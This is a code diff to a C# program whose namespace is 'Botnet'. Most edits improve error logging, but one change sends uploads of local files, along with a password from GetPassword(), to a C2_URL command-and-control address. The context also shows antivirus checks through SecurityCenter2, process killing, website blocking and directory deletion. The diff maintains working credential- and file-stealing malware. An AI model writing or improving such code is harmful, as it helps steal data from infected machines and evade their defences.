@@ -99,7 +99,7 @@ namespace Botnet
             catch (Exception e)
             {
                 Console.WriteLine("No connection detected!");
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
                 return false;
             }
         }
@@ -122,6 +122,10 @@ namespace Botnet
         {
             // TODO: print form data
             Console.WriteLine("Sending communication to server...");
+            foreach (string key in formData)
+            {
+                Console.WriteLine("{0} {1}", key, formData[key]);
+            }
             byte[] responseBytes;
             while (true)
             {
@@ -160,7 +164,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                     WaitForInternet();
                 }
             }
@@ -184,13 +188,13 @@ namespace Botnet
                                 ["password"] = GetPassword(),
                                 ["localPathFile"] = Path.GetDirectoryName(filename).Replace(":", "").Replace("\\", "/").Replace(" ", "")
                             };
-                            HttpUploadFile(BASE_URL, filename, "file", "", nvc);
+                            HttpUploadFile(C2_URL, filename, "file", "", nvc);
                             break;
                         }
                     }
                     catch (Exception e)
                     {
-                        Console.WriteLine(e.StackTrace);
+                        Console.WriteLine(e);
                         WaitForInternet();
                     }
                 }
@@ -200,6 +204,7 @@ namespace Botnet
 
         public static void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
         {
+            Console.WriteLine("Uploading file [" + file + "] at URI [" + url + "]");
             string boundary = "---------------------------" + DateTime.Now.Ticks.ToString("x");
             byte[] boundaryBytes = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
 
@@ -229,7 +234,7 @@ namespace Botnet
 
             FileStream fileStream = new FileStream(file, FileMode.Open, FileAccess.Read);
             byte[] buffer = new byte[4096];
-            int bytesRead = 0;
+            int bytesRead;
             while ((bytesRead = fileStream.Read(buffer, 0, buffer.Length)) != 0)
             {
                 rs.Write(buffer, 0, bytesRead);
@@ -249,7 +254,10 @@ namespace Botnet
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
+            }
+            finally
+            {
                 wresp?.Close();
             }
         }
@@ -275,7 +283,7 @@ namespace Botnet
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
             }
             File.Delete(websitesToBlockFile);
         }
@@ -440,12 +448,12 @@ namespace Botnet
             }
             catch (IOException e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
                 Directory.Delete(path, true);
             }
             catch (UnauthorizedAccessException e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
                 Directory.Delete(path, true);
             }
         }
@@ -467,7 +475,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
 
                 }
         }
@@ -505,7 +513,7 @@ namespace Botnet
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
             }
             // Windows Vista or later
             wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
@@ -518,7 +526,7 @@ namespace Botnet
             }
             catch (Exception e)
             {
-                Console.WriteLine(e.StackTrace);
+                Console.WriteLine(e);
             }
             return false;
             */
@@ -678,7 +686,7 @@ namespace Botnet
                 catch (Exception e)
                 {
                     Console.WriteLine("killing: " + exePath);
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                 }
             }
         }
@@ -731,7 +739,7 @@ namespace Botnet
                 }
                 catch (Exception e)
                 {
-                    Console.WriteLine(e.StackTrace);
+                    Console.WriteLine(e);
                     WaitForInternet();
                 }
             }
